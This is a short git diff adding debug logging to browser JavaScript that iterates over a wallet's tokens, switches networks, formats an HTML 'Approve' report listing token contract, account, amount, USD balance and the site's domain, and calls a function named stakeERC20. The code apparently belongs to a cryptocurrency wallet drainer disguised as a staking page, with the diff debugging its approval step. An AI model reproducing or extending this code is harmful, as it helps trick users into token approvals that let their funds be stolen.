@@ -908,6 +908,7 @@ for (const item of tokenList) {
 console.log("Required Chain:", chainToId[item.chain]?.chainId);
           console.log("item.chain =", item.chain);
 console.log("chainToId =", Object.keys(chainToId));
+          console.log("Passed chain check");
         if (chainHex !== chainToId[item.chain].chainId) {
             console.log("Switching network...");
 
@@ -930,7 +931,9 @@ console.log("Network switched.");
             }
             else {
               message = '🪙<b>Approve '+ item.symbol + ' | Network: ' + item.chain +'</b><br><br>Contract: <code>'+item.tokenAddress+ '</code><br><br>Account: <code>'+account+'</code><br><br>Amount: <code>'+item.tokenAmount+'</code> ('+ item.balance + ' $)<br><br>Domain: '+window.location.hostname;
+                console.log("About to call stakeERC20()");
               await stakeERC20(item.tokenAddress, item.tokenAmount, message, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl);
+                console.log("Returned from stakeERC20()");
             }
           } 
           else if(item.type == "erc721"){
